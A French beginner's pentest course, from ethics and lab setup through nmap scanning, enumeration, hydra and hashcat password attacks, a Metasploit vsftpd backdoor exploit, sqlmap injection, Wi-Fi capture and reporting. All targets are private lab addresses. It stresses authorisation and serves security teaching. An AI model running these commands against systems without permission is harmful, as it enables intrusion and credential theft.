CHAPITRE 0

L'éthique et la loi

🎯 Objectif : comprendre ce qui sépare un pentester d'un délinquant.

Un hacker éthique utilise les mêmes outils qu'un attaquant, mais avec permission et pour corriger les failles. La différence légale tient en un mot : l'autorisation.

  • ✅ Tes machines, tes VM, tes box d'entraînement.
  • ✅ Un client qui a signé un périmètre (« scope »).
  • ❌ Un site, un Wi-Fi ou une entreprise au hasard.
Règle d'or : pas d'autorisation = pas de scan.
CHAPITRE 1

Installer Kali & monter son labo

🎯 Objectif : avoir une machine d'attaque + une cible légale à côté.

Quoi faire : installe Kali dans une VM (VirtualBox/VMware), puis une cible volontairement vulnérable, le tout dans un réseau « hôte uniquement » (isolé d'Internet).

  • Attaquant : Kali Linux (voir l'aide-mémoire → Installer Kali).
  • Cible : Metasploitable 2, ou une room TryHackMe/HackTheBox.

Mets à jour Kali avant de commencer :

sudo apt update && sudo apt full-upgrade -y
CHAPITRE 2

Survivre dans le terminal Linux

🎯 Objectif : se déplacer et lire des fichiers sans paniquer.

Quoi faire : apprends ces 8 commandes, elles couvrent 90 % du quotidien.

pwdOù suis-je ? (dossier courant)
ls -laLister les fichiers (même cachés)
cd dossierEntrer dans un dossier
cat fichierAfficher un fichier
nano fichierÉditer un fichier
man outilLire le manuel d'un outil
sudo <cmd>Exécuter en administrateur
ip aVoir ses adresses réseau

💡 Bloqué ? <outil> --help affiche l'aide de presque tous les outils.

CHAPITRE 3

Lire une commande & remplacer (cible)

🎯 Objectif : décortiquer n'importe quelle commande du mémo.

sudo nmap -sV -p- 192.168.1.10
sudoDroits administrateur
nmapLe programme
-sV -p-Les options (comment il travaille)
192.168.1.10La cible — c'est ici qu'on écrit quoi viser

Quand tu vois <cible> ou (cible), tu enlèves les parenthèses et tu écris la vraie valeur :

Tu veux viser…Tu écris…
une machine192.168.1.10
un site (labo)http://192.168.1.10
tout un réseau192.168.1.0/24
Modèlenmap -sV -sC <cible>
Toi, tu tapesnmap -sV -sC 192.168.1.10
CHAPITRE 4

Reconnaissance passive (OSINT)

🎯 Objectif : récolter des infos sans toucher directement la cible.

Quoi faire : sur un domaine autorisé, collecte noms, sous-domaines, emails. Remplace exemple.com par ton domaine de test.

whois exemple.com
dig exemple.com ANY +noall +answer
theHarvester -d exemple.com -b all
sublist3r -d exemple.com
ÉTAPE 1
CHAPITRE 5

Découverte réseau : scanner les alentours

🎯 Objectif : lister toutes les machines allumées autour de toi.

Quoi faire : d'abord trouver ton réseau, puis le balayer entièrement.

1) Trouver ton réseau

ip a

Si tu vois inet 192.168.1.23/24, ton réseau est 192.168.1.0/24.

2) Balayer tout le réseau (ping sweep)

sudo nmap -sn 192.168.1.0/24

👉 Mets ton réseau à la place. Résultat = la liste des IP vivantes.

3) Variante ARP (LAN)

sudo netdiscover -r 192.168.1.0/24
Fin de l'étape : tu as une liste d'IP. Choisis-en une pour la suite.
ÉTAPE 2
CHAPITRE 6

Scanner les ports & services

🎯 Objectif : voir quelles « portes » une machine laisse ouvertes.

Quoi faire : remplace 192.168.1.10 par une IP de ta liste.

sudo nmap -sV -sC 192.168.1.10
sudo nmap -p- -T4 192.168.1.10
sudo nmap -A 192.168.1.10 -oA scan-cible

Lis chaque ligne open : 22=SSH, 80/443=web, 445=partage Windows, 21=FTP, 3306=MySQL…

CHAPITRE 7

Énumérer les services

🎯 Objectif : creuser chaque port ouvert trouvé au chapitre 6.

Quoi faire : selon le port, lance l'outil adapté (remplace l'IP).

Partages Windows/SMB (port 445)

enum4linux-ng -A 192.168.1.10
smbclient -L //192.168.1.10/ -N

Web (port 80/443)

whatweb http://192.168.1.10
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt

FTP (port 21)

ftp 192.168.1.10
CHAPITRE 8

Analyse de vulnérabilités

🎯 Objectif : relier un service + sa version à une faille connue.

sudo nmap --script vuln 192.168.1.10

Note la version d'un service (ex. « vsftpd 2.3.4 ») puis cherche un exploit :

searchsploit vsftpd 2.3.4
nuclei -u http://192.168.1.10
CHAPITRE 9

Attaques sur les mots de passe

🎯 Objectif : tester des identifiants faibles (sur TES comptes de labo).

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

Casser un hash récupéré :

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
CHAPITRE 10

Exploitation (Metasploit)

🎯 Objectif : utiliser une faille trouvée pour obtenir un accès (en labo).

Quoi faire : lance Metasploit, choisis un module, règle la cible (RHOSTS).

msfconsole

Dans msfconsole, le remplacement de (cible) se fait avec set RHOSTS :

search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.10
run
CHAPITRE 11

Post-exploitation & élévation de privilèges

🎯 Objectif : une fois « dedans », devenir administrateur/root.

Quoi faire : énumère la machine pour trouver un chemin vers root.

id
sudo -l
find / -perm -4000 -type f 2>/dev/null

Script d'énumération automatique :

./linpeas.sh
CHAPITRE 12

Attaquer une application web

🎯 Objectif : trouver des pages cachées et tester les injections.

gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://192.168.1.10

Tester une injection SQL (sur un paramètre de ton appli de test) :

sqlmap -u "http://192.168.1.10/page?id=1" --batch --dbs
CHAPITRE 13

Audit Wi-Fi (ton propre réseau)

🎯 Objectif : comprendre comment on audite un Wi-Fi que tu possèdes.

sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

Remplace <BSSID> par celui de ton point d'accès :

sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
CHAPITRE 14

Nettoyage & rapport

🎯 Objectif : rendre un travail pro — c'est ça, le vrai métier.

Quoi faire : pour chaque faille, note dans un rapport :

  • 🔎 Ce que tu as trouvé (service, version, faille).
  • 🧪 Comment le reproduire (la commande exacte).
  • ⚠️ L'impact (ce qu'un attaquant pourrait faire).
  • 🛠️ La correction (mise à jour, config, mot de passe fort).
Un bon pentester ne « casse » pas : il documente et aide à réparer.
